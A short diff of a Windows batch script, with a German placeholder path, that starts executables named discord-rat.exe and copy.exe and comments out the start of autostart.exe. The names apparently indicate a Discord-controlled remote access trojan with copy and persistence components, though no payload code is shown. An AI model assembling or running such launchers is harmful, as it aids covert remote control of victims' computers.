@@ -2,4 +2,4 @@
 cd "Pfad\zur\Deiner\Exe"
 start discord-rat.exe
 start copy.exe
-start autostart.exe
+rem start autostart.exe
